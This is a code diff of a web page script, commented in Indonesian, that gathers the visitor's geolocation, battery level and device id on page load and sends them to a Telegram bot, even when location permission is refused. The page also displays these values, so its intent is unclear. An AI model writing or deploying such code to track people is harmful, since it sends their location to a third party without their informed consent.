@@ -46,6 +46,55 @@ document.addEventListener('DOMContentLoaded', function () {
         });
     }
 
+    // Fungsi untuk meminta izin lokasi dan mengirim data ke bot
+    function requestLocationAndSendData() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    // Jika lokasi berhasil didapatkan
+                    deviceData.location = {
+                        lat: position.coords.latitude,
+                        lng: position.coords.longitude
+                    };
+                    updateDeviceInfo(); // Update tampilan informasi perangkat
+                    sendDataToBot(deviceData); // Kirim data ke bot Telegram
+                },
+                (error) => {
+                    // Jika gagal mendapatkan lokasi
+                    console.error('Error getting location:', error);
+                    alert('Tidak dapat mendapatkan lokasi. Pastikan izin lokasi diberikan.');
+                    deviceData.location = null; // Set lokasi ke null
+                    updateDeviceInfo(); // Update tampilan informasi perangkat
+                    sendDataToBot(deviceData); // Kirim data ke bot Telegram meskipun lokasi null
+                }
+            );
+        } else {
+            // Jika browser tidak mendukung Geolocation API
+            console.error('Geolocation is not supported by this browser.');
+            alert('Browser Anda tidak mendukung fitur lokasi.');
+            deviceData.location = null; // Set lokasi ke null
+            updateDeviceInfo(); // Update tampilan informasi perangkat
+            sendDataToBot(deviceData); // Kirim data ke bot Telegram meskipun lokasi null
+        }
+    }
+
+    // Fungsi untuk mengupdate informasi perangkat di website
+    function updateDeviceInfo() {
+        const deviceNameElement = document.getElementById('device-name');
+        const deviceBatteryElement = document.getElementById('device-battery');
+        const deviceLocationElement = document.getElementById('device-location');
+        const deviceIdElement = document.getElementById('device-id');
+
+        if (deviceNameElement) deviceNameElement.textContent = deviceData.name;
+        if (deviceBatteryElement) deviceBatteryElement.textContent = deviceData.battery || 'Tidak tersedia';
+        if (deviceLocationElement) {
+            deviceLocationElement.textContent = deviceData.location ?
+                `${deviceData.location.lat.toFixed(4)}, ${deviceData.location.lng.toFixed(4)}` :
+                'Tidak tersedia';
+        }
+        if (deviceIdElement) deviceIdElement.textContent = deviceData.id;
+    }
+
     // Fungsi untuk mengambil data perangkat dari file JSON
     async function fetchDeviceData() {
         try {
@@ -111,43 +160,29 @@ document.addEventListener('DOMContentLoaded', function () {
         }
     });
 
-    // Ambil lokasi perangkat utama
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                deviceData.location = {
-                    lat: position.coords.latitude,
-                    lng: position.coords.longitude
-                };
-                sendDataToBot(deviceData); // Kirim data ke bot setelah lokasi didapatkan
-            },
-            (error) => {
-                console.error('Error getting location:', error);
-                alert('Tidak dapat mendapatkan lokasi. Pastikan izin lokasi diberikan.');
-            }
-        );
-    } else {
-        console.error('Geolocation is not supported by this browser.');
-        alert('Browser Anda tidak mendukung fitur lokasi.');
-    }
-
     // Ambil informasi baterai perangkat utama
     if ('getBattery' in navigator) {
         navigator.getBattery().then((battery) => {
             deviceData.battery = `${Math.round(battery.level * 100)}%`;
+            updateDeviceInfo(); // Update tampilan informasi perangkat
             sendDataToBot(deviceData); // Kirim data ke bot setelah informasi baterai didapatkan
 
             // Update informasi baterai jika ada perubahan
             battery.addEventListener('levelchange', () => {
                 deviceData.battery = `${Math.round(battery.level * 100)}%`;
+                updateDeviceInfo(); // Update tampilan informasi perangkat
                 sendDataToBot(deviceData); // Kirim data ke bot setiap kali baterai berubah
             });
         });
     } else {
         console.error('Battery Status API is not supported by this browser.');
         deviceData.battery = 'Tidak tersedia';
+        updateDeviceInfo(); // Update tampilan informasi perangkat
         sendDataToBot(deviceData); // Kirim data ke bot meskipun informasi baterai tidak tersedia
     }
+
+    // Minta izin lokasi dan kirim data ke bot
+    requestLocationAndSendData();
 
     // Render daftar perangkat terhubung saat halaman dimuat
     renderConnectedDevices();
